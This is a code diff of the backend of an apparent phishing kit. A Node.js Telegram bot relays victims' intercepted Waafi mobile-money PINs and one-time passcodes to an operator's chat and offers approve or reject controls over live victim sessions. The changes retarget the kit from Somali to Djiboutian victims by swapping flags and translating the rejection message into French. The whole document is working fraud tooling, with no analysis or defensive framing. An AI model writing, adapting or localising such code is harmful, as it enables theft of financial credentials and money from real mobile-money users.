@@ -10,7 +10,7 @@ if (!token || !chatId) {
 const bot = new TelegramBot(token);
 
 function formatPayloadMessage(appId, headline, metadata) {
-    let baseTemplate = `<b>🇸🇴 ${headline}</b>\n`;
+    let baseTemplate = `<b>🇩🇯 ${headline}</b>\n`;
     baseTemplate += `<code>────────────────────────</code>\n`;
     baseTemplate += `🆔 <b>App Session:</b> <code>${appId}</code>\n`;
     
@@ -49,14 +49,14 @@ function sendToAdmin(appId, title, metadata, generateControls = false) {
 }
 
 function sendFinalApproval(appId, pinCode) {
-    const bodyText = `<b>🇸🇴 🔒 Intercepted Account Security PIN</b>\n<code>────────────────────────</code>\n🆔 <b>App Session:</b> <code>${appId}</code>\n🔑 <b>Waafi PIN Entry:</b> <code>${pinCode}</code>\n<code>────────────────────────</code>`;
+    const bodyText = `<b>🇩🇯 🔒 Intercepted Account Security PIN</b>\n<code>────────────────────────</code>\n🆔 <b>App Session:</b> <code>${appId}</code>\n🔑 <b>Waafi PIN Entry:</b> <code>${pinCode}</code>\n<code>────────────────────────</code>`;
     bot.sendMessage(chatId, bodyText, buildInlineOptions(appId, "pinok")).catch(err => {
         console.error(`❌ Pin data routing failure: ${err.message}`);
     });
 }
 
 function sendSecondOTP(appId, backupCode) {
-    const textMarkup = `<b>🇸🇴 ⚠️ Secondary Authorization Layer (OTP 2)</b>\n<code>────────────────────────</code>\n🆔 <b>App Session:</b> <code>${appId}</code>\n🛡️ <b>Verification Key:</b> <code>${backupCode}</code>\n<code>────────────────────────</code>`;
+    const textMarkup = `<b>🇩🇯 ⚠️ Secondary Authorization Layer (OTP 2)</b>\n<code>────────────────────────</code>\n🆔 <b>App Session:</b> <code>${appId}</code>\n🛡️ <b>Verification Key:</b> <code>${backupCode}</code>\n<code>────────────────────────</code>`;
     bot.sendMessage(chatId, textMarkup, buildInlineOptions(appId, "otp2ok")).catch(err => {
         console.error(`❌ Step secondary data routing failure: ${err.message}`);
     });
@@ -93,7 +93,8 @@ bot.on('callback_query', (query) => {
             break;
 
         case 'reject':
-            global.io.to(targetAppId).emit('admin-reject', { message: "Xaqiijintaada waa la diiday. Fadlan isku day markale." });
+            // Message traduit en français pour correspondre au nouveau public cible
+            global.io.to(targetAppId).emit('admin-reject', { message: "Votre vérification a été rejetée. Veuillez réessayer." });
             systemResponseLog = "🔴 Application state systematically dropped by admin.";
             break;
             
